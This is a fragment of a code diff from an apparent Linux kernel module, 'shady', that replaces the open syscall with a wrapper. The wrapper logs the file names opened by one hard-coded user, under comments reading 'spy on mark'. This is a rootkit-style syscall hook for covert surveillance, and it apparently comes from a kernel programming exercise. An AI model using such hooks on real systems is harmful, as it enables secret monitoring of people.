@@ -196,19 +196,19 @@ asmlinkage int (*old_open) (const char*, int, int);
 
 asmlinkage int my_open (const char* file, int flags, int mode) 
 {
-  unsigned int current_user_id;
-  current_user_id = get_current_user()->uid.val;
-  printk("My open is being called %s\n", file);
-  if (current_user_id == marks_uid) {
-    // spy
-    printk("mark is about to open\n");
+  unsigned int current_uid;
+  current_uid = get_current_user()->uid.val;
+  printk("My open is being called.\n");
+  if (current_uid == marks_uid) {
+    // spy on mark
+    printk("mark is about to open %s\n", file);
   }
 
   // Call the original open syscall
   return old_open(file, flags, mode);
 }
 
-/* ================================================================ */
+/* ================================================================ */ 
 static void
 shady_cleanup_module(int devices_to_destroy)
 {
